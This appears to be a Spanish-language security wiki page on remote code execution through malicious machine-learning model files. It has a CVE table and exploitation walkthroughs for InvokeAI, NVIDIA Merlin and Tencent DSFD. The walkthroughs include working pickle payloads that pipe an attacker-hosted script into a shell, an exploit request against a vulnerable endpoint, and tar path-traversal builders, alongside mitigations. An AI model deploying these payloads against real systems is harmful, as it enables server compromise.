# RCE en modelos

{{#include ../banners/hacktricks-training.md}}

## Cargar modelos para RCE

Los modelos de Machine Learning suelen compartirse en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden cargarse en máquinas de desarrolladores o sistemas de producción para usarlos. Normalmente los modelos no deberían contener código malicioso, pero hay casos en los que el modelo puede usarse para ejecutar código arbitrario en el sistema como característica intencionada o por una vulnerabilidad en la librería de carga de modelos.

Al momento de la redacción estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el checkpoint del modelo conduce a ejecución de código (omitiendo la protección `weights_only`)                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de modelo malicioso provoca ejecución de código; Java deserialization RCE en la API de gestión                           | |
| **NVIDIA Merlin Transformers4Rec** | Deserialización insegura de checkpoints vía `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint no confiable dispara el reducer de pickle durante `load_model_trainer_states_from_checkpoint` → ejecución de código en el worker de ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML usa `yaml.unsafe_load` (ejecución de código) <br> Cargar modelo con la capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Un `.tflite` especialmente creado dispara un desbordamiento entero → corrupción del heap (potencial RCE)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo vía `joblib.load` ejecuta pickle con el payload `__reduce__` del atacante                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` por defecto permitía arrays de objetos pickled – `.npy/.npz` maliciosos disparan ejecución de código                         | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | La ruta de external-weights de un modelo ONNX puede escapar del directorio (leer archivos arbitrarios) <br> Un tar de ONNX malicioso puede sobrescribir archivos arbitrarios (llevando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modelo con operador personalizado requiere cargar código nativo del atacante; grafos complejos abusan de la lógica para ejecutar computaciones no previstas   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite traversal de rutas relativas para escribir archivos (p. ej., sobrescribir `.bashrc` para RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (múltiples heap overflows)                                                                         | Archivo de modelo GGUF malformado causa desbordamientos de buffer en el parser, permitiendo ejecución de código arbitrario en el sistema víctima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un HDF5 (`.h5`) malicioso con capa Lambda aún ejecuta código al cargar (Keras safe_mode no cubre el formato antiguo – “downgrade attack”) | |
| **Others** (general)        | *Fallo de diseño* – Pickle serialization                                                                                         | Muchas herramientas ML (p. ej., formatos basados en pickle, `pickle.load` de Python) ejecutarán código arbitrario embebido en archivos de modelo a menos que se mitiguen | |

Además, existen algunos modelos basados en pickle de Python como los usados por [PyTorch](https://github.com/pytorch/pytorch/security) que pueden usarse para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, incluso si no están listados en la tabla anterior.

### 🆕  InvokeAI RCE vía `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web open-source para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente, el endpoint acaba llamando a:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo suministrado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **pickle deserialization**. Dado que el contenido proviene directamente de la URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, provocando **remote code execution (RCE)** en el servidor InvokeAI.

La vulnerabilidad fue asignada **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía de explotación

1. Crear un checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controles (p. ej., `http://ATTACKER/payload.ckpt`).
3. Invoca el endpoint vulnerable (no se requiere autenticación):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → se ejecuta el gadget `os.system` y el atacante obtiene ejecución de código en el contexto del proceso de InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el flujo.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` reachable by the attacker  
•  Process has permissions to execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – el parche establece `scan=True` por defecto y realiza un escaneo de malware antes de la deserialización.  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Recuerde que **cualquier** formato basado en pickle de Python (incluyendo muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es inherentemente inseguro para deserializar desde fuentes no confiables.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE a través de `torch.load` inseguro (CVE-2025-23298)

Transformers4Rec de NVIDIA (parte de Merlin) exponía un loader de checkpoints inseguro que llamaba directamente a `torch.load()` sobre rutas proporcionadas por el usuario. Dado que `torch.load` depende de Python `pickle`, un checkpoint controlado por un atacante puede ejecutar código arbitrario mediante un reducer durante la deserialización.

Ruta vulnerable (antes del parche): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por qué esto conduce a RCE: En Python pickle, un objeto puede definir un reducer (`__reduce__`/`__setstate__`) que devuelve un callable y argumentos. El callable se ejecuta durante la deserialización (unpickling). Si tal objeto está presente en un checkpoint, se ejecuta antes de que se utilicen los pesos.

Ejemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vectores de entrega y radio de impacto:
- Checkpoints/modelos troyanizados compartidos vía repos, buckets, o artifact registries
- Pipelines automatizados de resume/deploy que cargan checkpoints automáticamente
- La ejecución ocurre dentro de training/inference workers, a menudo con privilegios elevados (p. ej., root en contenedores)

Corrección: El commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) reemplazó la llamada directa `torch.load()` por un deserializador restringido y con lista de permitidos implementado en `transformers4rec/utils/serialization.py`. El nuevo loader valida tipos/campos y evita que se invoquen callables arbitrarios durante la carga.

Orientación defensiva específica para checkpoints de PyTorch:
- No deserialices con pickle datos no confiables. Prefiere formatos no ejecutables como [Safetensors](https://huggingface.co/docs/safetensors/index) u ONNX cuando sea posible.
- Si debes usar la serialización de PyTorch, asegúrate de `weights_only=True` (soportado en versiones recientes de PyTorch) o usa un unpickler personalizado con lista de permitidos similar al parche de Transformers4Rec.
- Exige procedencia/firma del modelo y ejecuta la deserialización en sandbox (seccomp/AppArmor; usuario no-root; FS restringido y sin salida de red).
- Monitoriza la aparición de procesos hijo inesperados por parte de servicios ML en el momento de cargar checkpoints; traza el uso de `torch.load()`/`pickle`.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Ejemplo – crear un modelo malicioso de PyTorch

- Crea el modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD de Tencent expone un endpoint `resnet` que deserializa datos controlados por el usuario. ZDI confirmó que un atacante remoto puede coaccionar a una víctima para que cargue una página/archivo malicioso, hacer que este empuje un blob serializado especialmente diseñado a ese endpoint y desencadene la deserialización como `root`, conduciendo a una compromisión total.

El flujo del exploit refleja el abuso típico de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Cualquier gadget accesible durante la deserialización (constructors, `__setstate__`, framework callbacks, etc.) puede ser weaponized de la misma manera, independientemente de si el transporte fue HTTP, WebSocket, o un archivo depositado en un directorio monitorizado.

## Modelos a Path Traversal

Como se comenta en [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelos usados por diferentes frameworks de IA se basan en archivos comprimidos, normalmente `.zip`. Por lo tanto, podría ser posible abusar de estos formatos para realizar ataques de path traversal, permitiendo leer archivos arbitrarios del sistema donde se carga el modelo.

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` cuando se cargue:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O bien, con el siguiente código puedes crear un modelo que cree un symlink al directorio `/tmp` cuando se cargue:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análisis en profundidad: Keras .keras deserialization and gadget hunting

Para una guía específica sobre los internals de .keras, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8 y el descubrimiento de gadgets post-fix dentro de la allowlist, vea:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencias

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
